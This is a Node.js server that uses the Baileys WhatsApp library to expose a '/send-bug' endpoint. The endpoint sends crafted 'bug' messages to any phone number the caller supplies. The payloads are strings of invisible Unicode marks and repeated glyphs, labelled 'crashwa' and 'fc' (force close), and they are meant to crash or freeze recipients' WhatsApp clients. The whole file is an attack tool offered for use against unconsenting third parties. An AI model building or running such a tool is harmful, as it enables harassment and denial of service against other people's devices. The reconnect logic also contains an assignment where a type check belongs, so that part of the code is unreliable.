const express = require("express");
const { makeWASocket, useSingleFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static("public"));

const { state, saveState } = useSingleFileAuthState("./auth_info.json");

let sock;
async function startSock() {
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
  });

  sock.ev.on("creds.update", saveState);

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const shouldReconnect = (lastDisconnect.error = Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) startSock();
    } else if (connection === "open") {
      console.log("✅ WhatsApp Connected");
    }
  });
}

startSock();

const bugs = {
  "crashwa": "‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎💥💥💥",
  "invisdelay": "‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ⏳⏳⏳",
  "fc-Tzting77": "࿇࿇࿇࿇࿇࿇࿇࿇࿇࿇⚠️FC Test",
  "invis": "‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎"
};

app.post("/send-bug", async (req, res) => {
  const { number, type } = req.body;
  const jid = number.includes("@s.whatsapp.net") ? number : number + "@s.whatsapp.net";
  const bugMessage = bugs[type];

  if (!bugMessage) return res.status(400).json({ message: "Tipe bug tidak valid!" });

  try {
    await sock.sendMessage(jid, { text: bugMessage });
    return res.json({ message: `✅ Bug ${type} terkirim ke ${number}` });
  } catch (e) {
    return res.status(500).json({ message: "❌ Gagal mengirim pesan!", error: e.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server ready on http://localhost:${PORT}`));
